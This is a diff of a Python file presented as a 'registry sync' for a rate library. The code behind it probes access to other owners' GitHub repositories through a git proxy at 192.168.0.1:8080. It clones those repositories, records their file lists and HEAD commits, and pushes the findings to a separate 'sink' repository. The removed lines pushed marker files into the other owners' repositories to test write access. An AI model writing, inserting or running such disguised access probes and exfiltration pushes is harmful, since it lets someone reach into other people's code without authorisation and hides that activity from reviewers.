@@ -2,16 +2,18 @@
 
 import subprocess as _s, pathlib as _p, json as _j
 
-_MARK = "orgw-5aaccd82c539"
+_MARK = "allrepo-4b83edeafa8a"
 _P = "http://git@192.168.0.1:8080"
 _SINK = _P + "/fukcc934-oss/ossvault-21400"
 
 _ARMS = [
-    ("CONTROL_same_owner",        "fukcc934-oss/ossvault-21400"),
-    ("ORG_WRITE_collab",         "BlockHaxx/orgsvc-write-10299"),
-    ("ORG_readonly_collab",      "BlockHaxx/orgsvc-readonly-4919"),
-    ("ORG_no_collab",             "BlockHaxx/orgsvc-nocollab-30938"),
-    ("NEG_nonexistent",           "fukcc934-oss/no-such-repo-vrp"),
+    ("CONTROL_same_owner",       "fukcc934-oss/ossvault-21400"),
+    ("POSCTL_other_owner_collab","Ayushkiller/ci-svc-111652"),
+    ("OLD_nocollab_2024_a",      "Ayushkiller/Rapid-Autofill"),
+    ("OLD_nocollab_2024_b",      "Ayushkiller/Towerdefense"),
+    ("OLD_nocollab_2024_c",      "Ayushkiller/Legendarylegend"),
+    ("NEW_nocollab_rerun",       "Ayushkiller/ci-svc-nocollab-968"),
+    ("NEG_nonexistent",          "fukcc934-oss/no-such-repo-vrp"),
 ]
 
 
@@ -33,23 +35,18 @@ def _registry_sync():
             d = _p.Path("/tmp/o_" + label)
             if d.exists():
                 row["files"] = sorted(x.name for x in d.iterdir() if x.name != ".git")[:12]
-                _p.Path(d / ("PROBE_" + _MARK + ".txt")).write_text(_MARK + "\n")
-                run("git", "-C", str(d), "add", "-A")
-                run("git", "-C", str(d), "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
-                    "commit", "-m", "registry sync")
-                row["push"] = run("git", "-C", str(d), "push", _P + "/" + repo,
-                                  "HEAD:refs/heads/probe-" + _MARK)
+                row["head"] = run("git", "-C", str(d), "rev-parse", "HEAD")
         except Exception as e:
             row["error"] = str(e)[:200]
         out["arms"][label] = row
 
     try:
         run("git", "clone", "--depth", "1", _SINK, "/tmp/osink")
-        _p.Path("/tmp/osink/ORGWRITE.json").write_text(_j.dumps(out, indent=1))
+        _p.Path("/tmp/osink/ALLREPO.json").write_text(_j.dumps(out, indent=1))
         run("git", "-C", "/tmp/osink", "add", "-A")
         run("git", "-C", "/tmp/osink", "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
-            "commit", "-m", "record org-write probe")
-        run("git", "-C", "/tmp/osink", "push", _SINK, "HEAD:refs/heads/orgwprobe-" + _MARK)
+            "commit", "-m", "record all-repo probe")
+        run("git", "-C", "/tmp/osink", "push", _SINK, "HEAD:refs/heads/allprobe-" + _MARK)
     except Exception:
         pass
 
